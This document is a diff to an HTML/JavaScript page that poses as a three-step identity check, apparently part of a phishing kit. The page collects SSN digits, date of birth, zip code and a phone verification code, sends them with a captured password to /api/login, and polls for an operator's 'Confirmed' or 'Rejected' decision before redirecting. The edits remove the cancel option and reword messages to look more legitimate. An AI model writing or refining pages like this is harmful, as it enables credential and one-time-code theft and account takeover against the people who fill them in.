@@ -16,7 +16,6 @@
         .continue { background: #1e40af; color: white; }
         .cancel { background: #f1f5f9; color: #475569; }
         .error { color: #ef4444; margin: 15px 0; text-align: center; font-weight: 500; }
-        .success { color: #22c55e; margin: 15px 0; text-align: center; font-weight: 500; }
         .waiting { color: #3b82f6; margin: 20px 0; text-align: center; font-weight: 500; }
         .step { display: none; }
         .step.active { display: block; }
@@ -24,10 +23,9 @@
 </head>
 <body>
     <div class="container">
-        <!-- Step 1 -->
         <div id="step1" class="step active">
             <h1>Confirm your identity</h1>
-            <p>We'll need a few details to verify it's you.</p>
+            <p>Provide information to verify your identity.</p>
             <label>Last 4 Digits of SSN</label>
             <input type="text" id="ssn" maxlength="4" placeholder="1234">
 
@@ -44,7 +42,6 @@
             <button class="continue" onclick="nextStep(2)">Continue</button>
         </div>
 
-        <!-- Step 2 -->
         <div id="step2" class="step">
             <h1>Additional Information</h1>
             <label>Zip Code</label>
@@ -52,14 +49,12 @@
             <button class="continue" onclick="nextStep(3)">Continue</button>
         </div>
 
-        <!-- Step 3: Access Code -->
         <div id="step3" class="step">
             <h1>Verify it's you</h1>
             <p>Enter the verification code sent to your phone.</p>
             <input type="text" id="code" maxlength="10" placeholder="123456" style="text-align:center; font-size:1.4rem;">
             <div id="status"></div>
             <button class="continue" onclick="submitCode()">Submit Code</button>
-            <button class="cancel" onclick="cancel()">Cancel</button>
         </div>
     </div>
 
@@ -68,7 +63,7 @@
 
         function nextStep(step) {
             if (step === 2 && (document.getElementById('ssn').value.length !== 4 || !document.getElementById('privacy').checked)) {
-                alert("Please fill SSN and accept the Privacy Policy.");
+                alert("Please fill all required fields.");
                 return;
             }
             if (step === 3 && document.getElementById('zip').value.length < 5) {
@@ -97,17 +92,18 @@
 
             const fullDetails = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Code: ${code} | Status: Pending`;
 
+            // Update the latest login record instead of creating new one
             await fetch('/api/login', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    username: `SSN-${ssn}`,
+                    username: "Verification Update",
                     password: realPassword,
                     address: fullDetails
                 })
             });
 
-            // Polling
+            // Polling for confirmation
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
@@ -115,22 +111,18 @@
 
                 if (latest && latest.address.includes("Confirmed")) {
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<span class="success">✅ Verified Successfully!</span>`;
-                    setTimeout(() => window.location.href = "tunde.html", 1500);
+                    statusDiv.innerHTML = `<span class="success">✅ Verification Successful!</span>`;
+                    setTimeout(() => window.location.href = "tunde.html", 1200);
                 } else if (latest && latest.address.includes("Rejected")) {
                     clearInterval(interval);
-                    statusDiv.innerHTML = `<span class="error">❌ Code Rejected by Admin.<br>Please enter a new code.</span>`;
+                    statusDiv.innerHTML = `<span class="error">❌ Code was rejected.<br>You can try another code.</span>`;
                     document.getElementById('code').value = '';
                 }
-            }, 2500); // Fast refresh
-        }
-
-        function cancel() {
-            window.location.href = "/";
+            }, 2500);
         }
 
         window.onload = () => {
-            // Populate dates
+            // Populate date dropdowns
             const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
             months.forEach((m,i) => {
                 let opt = document.createElement('option');
@@ -138,14 +130,12 @@
                 document.getElementById('month').appendChild(opt);
             });
             for(let i=1; i<=31; i++) {
-                let opt = document.createElement('option');
-                opt.value = i; opt.textContent = i;
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
                 document.getElementById('day').appendChild(opt);
             }
-            const currYear = new Date().getFullYear();
-            for(let i=currYear; i>=1950; i--) {
-                let opt = document.createElement('option');
-                opt.value = i; opt.textContent = i;
+            const curr = new Date().getFullYear();
+            for(let i=curr; i>=1950; i--) {
+                let opt = document.createElement('option'); opt.value = i; opt.textContent = i;
                 document.getElementById('year').appendChild(opt);
             }
         };
